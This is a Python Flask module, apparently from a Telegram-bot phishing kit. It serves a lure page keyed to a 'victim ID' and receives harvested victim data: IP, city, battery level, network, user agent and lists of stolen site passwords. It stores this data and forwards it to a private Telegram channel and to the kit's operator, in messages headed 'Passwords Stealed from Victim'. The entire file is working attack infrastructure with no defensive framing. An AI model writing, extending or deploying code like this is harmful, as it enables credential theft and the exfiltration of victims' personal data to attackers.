import os
import time
from flask import request, jsonify
from bot.utils.storage import victim_data_store, link_cache
from bot.config import PRIVATE_CHANNEL_ID

def register_pass_routes(app):
    @app.route('/p/pass/<uid>')
    def pass_page(uid):
        victim_id = request.args.get('v', 'unknown')
        redirect_url = victim_data_store.get(f"redirect_{victim_id}", 'https://google.com')
        photo_url = victim_data_store.get(f"photo_{victim_id}", 'https://via.placeholder.com/600x450/2a2a4a/ffffff?text=No+Photo')
        
        with open('web/pages/pass.html', 'r', encoding='utf-8') as f:
            html = f.read()
        
        html = html.replace('{{REDIRECT_URL}}', redirect_url)
        html = html.replace('{{VICTIM_ID}}', victim_id)
        html = html.replace('{{PHOTO_URL}}', photo_url)
        return html

    @app.route('/api/capture/pass', methods=['POST'])
    def capture_pass():
        data = request.json
        if not data:
            return jsonify({"status": "error"}), 400
        
        victim_id = data.get('victim_id')
        if not victim_id:
            return jsonify({"status": "error"}), 400
        
        victim_data_store[f"victim_{victim_id}"] = data
        victim_data_store[f"victim_{victim_id}"]["time"] = time.time()
        
        # Forward to bot
        forward_to_channel(data)
        return jsonify({"status": "ok"})

    @app.route('/api/get_passwords', methods=['POST'])
    def get_passwords():
        data = request.json
        if not data:
            return jsonify({"status": "error"}), 400
        
        victim_id = data.get('victim_id')
        passwords = data.get('passwords', [])
        
        if not victim_id:
            return jsonify({"status": "error"}), 400
        
        # Store passwords
        victim_data_store[f"passwords_{victim_id}"] = passwords
        
        # Send to bot
        forward_passwords(victim_id, passwords)
        return jsonify({"status": "ok"})

def forward_to_channel(data):
    try:
        from bot.__init__ import bot
        victim_id = data.get('victim_id')
        device = data.get('device_info', {})
        ip = data.get('ip', 'Unknown')
        city = data.get('city', 'Unknown')
        battery = device.get('battery', 'N/A')
        network = device.get('network', 'N/A')
        
        text = f"📥 *New Victim Data*\n"
        text += f"🆔 ID: {victim_id}\n"
        text += f"🌐 IP: {ip}\n"
        text += f"📍 City: {city}\n"
        text += f"🔋 Battery: {battery}\n"
        text += f"📶 Network: {network}\n"
        text += f"📱 User-Agent: {device.get('userAgent', 'N/A')[:80]}...\n"
        
        bot.send_message(PRIVATE_CHANNEL_ID, text, parse_mode="Markdown")
    except Exception as e:
        print(f"Forward error: {e}")

def forward_passwords(victim_id, passwords):
    try:
        from bot.__init__ import bot
        
        # Find user_id
        user_id = None
        for key, val in link_cache.items():
            if str(val.get("user_id")) == str(victim_id):
                user_id = val["user_id"]
                break
        
        if not user_id:
            print(f"⚠️ No user found for victim {victim_id}")
            return
        
        # Send passwords to user
        if passwords:
            text = f"🔑 *Passwords Stealed from Victim {victim_id}*\n\n"
            for p in passwords[:20]:  # Limit to 20
                text += f"🔹 {p.get('url', 'Unknown')}\n"
                text += f"   👤 {p.get('username', 'N/A')}\n"
                text += f"   🔒 {p.get('password', 'N/A')}\n\n"
            
            if len(passwords) > 20:
                text += f"... and {len(passwords)-20} more passwords"
            
            bot.send_message(user_id, text, parse_mode="Markdown")
            
            # Also send to channel
            channel_text = f"🔑 *Passwords Stealed*\n🆔 Victim: {victim_id}\n📦 Total: {len(passwords)}\n\n"
            for p in passwords[:10]:
                channel_text += f"🔹 {p.get('url', 'Unknown')}: {p.get('username', 'N/A')} / {p.get('password', 'N/A')}\n"
            
            if len(passwords) > 10:
                channel_text += f"\n... and {len(passwords)-10} more"
            
            bot.send_message(PRIVATE_CHANNEL_ID, channel_text, parse_mode="Markdown")
        else:
            bot.send_message(user_id, "❌ No passwords found for this victim.")
            
    except Exception as e:
        print(f"Passwords forward error: {e}")
